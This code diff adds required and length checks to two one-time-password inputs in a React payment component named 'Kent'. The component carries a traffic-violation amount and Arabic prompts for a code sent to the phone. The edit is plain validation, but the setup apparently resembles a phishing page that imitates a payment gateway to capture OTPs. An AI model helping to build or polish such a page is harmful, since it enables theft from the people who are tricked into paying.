@@ -659,7 +659,9 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   </div>
                   <input
                     type="tel"
+                    minLength={6}
                     maxLength={6}
+                    required
                     placeholder="الرمز  المرسل إلى الجوال"
                     className="text-center text-lg py-6 border-blue-200"
                     value={paymentInfo.otp2 || ""}
@@ -828,6 +830,7 @@ export default function Kent(props: { setPage?: any; violationValue: number }) {
                   <input
                     type="tel"
                     maxLength={6}
+                    required
                     placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
                     className="text-center text-lg py-6 border-blue-200"
                     value={paymentInfo.otp || ""}
